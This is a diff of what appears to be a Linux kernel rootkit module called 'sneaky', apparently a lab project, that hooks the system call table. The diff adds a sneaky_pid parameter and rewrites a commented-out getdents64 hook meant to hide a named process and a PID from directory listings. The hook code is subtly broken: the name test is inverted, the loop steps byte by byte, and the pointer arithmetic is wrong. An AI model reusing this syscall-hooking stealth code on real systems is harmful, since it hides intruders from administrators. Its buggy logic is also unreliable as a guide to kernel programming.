@@ -14,6 +14,8 @@
 
 // This is a pointer to the system call table
 static unsigned long *sys_call_table;
+static char * sneaky_pid;
+module_param(sneaky_pid, charp, 0660);
 
 // Helper functions, turn on and off the PTE address protection mode
 // for syscall_table pointer
@@ -64,51 +66,48 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   return (*original_openat)(regs);
 }
 
-/* asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
-
-asmlinkage long sneaky_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)
-{
-
-  long bytes_read;
-  char *head;
-  unsigned long pos = 0;
-  char *sneaky_name = "sneaky_process";
-  size_t sneaky_sz = strlen(sneaky_name);
-
-  bytes_read = (*original_getdents64)(fd, dirent, count);
-  head = (char *)dirent;
-
-  if (bytes_read <= 0)
-  {
-    return bytes_read;
-  }
-  else
-  {
-    while (pos < bytes_read)
-    {
-      struct linux_dirent64 *cur = (struct linux_dirent64 *)(head + pos);
-
-      if (strncmp(cur->d_name, sneaky_name, sneaky_sz))
-      {
-
-        void *start = dir_entries + pos;
-        void *end = dir_entries + pos + cur_dir->d_reclen;
-        size_t n_bytes = bytes_read - (pos + cur_dir->d_reclen);
-        memmove(start, end, n_bytes);
-        bytes_read -= cur_dir->d_reclen;
-        break;
-      }
-      else
-      {
-        pos += cur->d_reclen;
-      }
-      pos = pos + cur->d_reclen;
-      // pos++;
-      // cur += cur->d_reclen;
-    }
-  }
-  return bytes_read;
-} */
+/*asmlinkage long (*original_getdents64)(struct pt_regs *);                                                                                                                         
+                                                                                                                                                                                    
+asmlinkage long sneaky_sys_getdents(struct pt_regs *regs)                                                                                                                           
+{                                                                                                                                                                                   
+                                                                                                                                                                                    
+  long bytes_read;                                                                                                                                                                  
+  struct linux_dirent64 __user *head;                                                                                                                                               
+  unsigned long pos = 0;                                                                                                                                                            
+  char *sneaky_name = "sneaky_process";                                                                                                                                             
+  size_t sneaky_sz = strlen(sneaky_name);                                                                                                                                           
+  size_t pid_sz = strlen(sneaky_pid);                                                                                                                                               
+                                                                                                                                                                                    
+  bytes_read = (*original_getdents64)(regs);                                                                                                                                        
+  head = (struct linux_dirent64 *)regs->si;                                                                                                                                         
+                                                                                                                                                                                    
+  if (bytes_read <= 0)                                                                                                                                                              
+  {                                                                                                                                                                                 
+    return bytes_read;                                                                                                                                                              
+  }                                                                                                                                                                                 
+  else                                                                                                                                                                              
+  {                                                                                                                                                                                 
+    while (pos < bytes_read)                                                                                                                                                        
+    {                                                                                                                                                                               
+      struct linux_dirent64 *cur = (struct linux_dirent64 *)((char *)head + pos);                                                                                                   
+                                                                                                                                                                                    
+      if (strncmp(cur->d_name, sneaky_name, sneaky_sz) ||                                                                                                                           
+          strncmp(cur->d_name, sneaky_pid, pid_sz)) {                                                                                                                                                                                                                                                                                                                                                         
+        void *end = cur + cur->d_reclen;                                                                                                                                            
+        size_t n_bytes = bytes_read - (pos + cur->d_reclen);                                                                                                                        
+        memmove(cur, end, n_bytes);                                                                                                                                                 
+        bytes_read -= cur->d_reclen;                                                                                                                                                
+        break;                                                                                                                                                                      
+      }                                                                                                                                                                             
+      else                                                                                                                                                                          
+      {                                                                                                                                                                             
+        //pos = pos + cur->d_reclen;                                                                                                                                                
+        pos++;                                                                                                                                                                      
+      }                                                                                                                                                                             
+    }                                                                                                                                                                               
+  }                                                                                                                                                                                 
+  return bytes_read;                                                                                                                                                                
+}*/
 
 asmlinkage long (*original_read)(struct pt_regs *);
 
